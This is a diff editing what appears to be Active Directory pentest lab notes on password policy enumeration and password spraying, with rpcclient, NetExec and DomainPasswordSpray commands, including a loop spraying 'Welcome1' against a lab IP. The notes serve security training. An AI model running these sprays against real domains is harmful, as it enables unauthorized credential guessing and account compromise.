@@ -55,7 +55,7 @@ Raw LDAP anonymous query. Useful when windapsearch is unavailable or for manual 
 ---
 ## Password Policy Enumeration
 
-**Linux:**
+>**Linux:**
 
 ```
 enum4linux -P <dc-ip>
@@ -69,7 +69,7 @@ nxc smb <dc-ip> -u <user> -p <password> --pass-pol
 
 Retrieve password policy with valid credentials via NetExec. `--pass-pol` pulls lockout threshold, duration, and minimum password length.
 
-**Windows:**
+>**Windows:**
 
 ```
 net accounts
@@ -86,7 +86,8 @@ Establish an anonymous SMB NULL session from a Windows host. Used as a prerequis
 ---
 ## Password Spraying
 
-**Linux:**
+>**Linux:**
+
 ```
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
@@ -103,9 +104,11 @@ sudo nxc smb <dc-ip> -u <valid-users-file> -p <password> | grep +
 
 Spray via SMB from a Linux host. `grep +` filters output to successful authentications only.
 
-**Windows:**
+>**Windows:**
+
+```powershell
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password <password> -OutFile <out-file> -ErrorAction SilentlyContinue
 ```
- Import-Module .\DomainPasswordSpray.ps1
-PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
-```
-Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us. We'll supply the `Password` flag and one single password and then use the `-OutFile` flag to write our output to a file for later use.
+
+Spray from a domain-joined Windows host. Omitting `-UserList` causes the tool to auto-generate the user list from the domain. `-OutFile` writes successful authentications to file. `-ErrorAction SilentlyContinue` suppresses failed attempt noise.
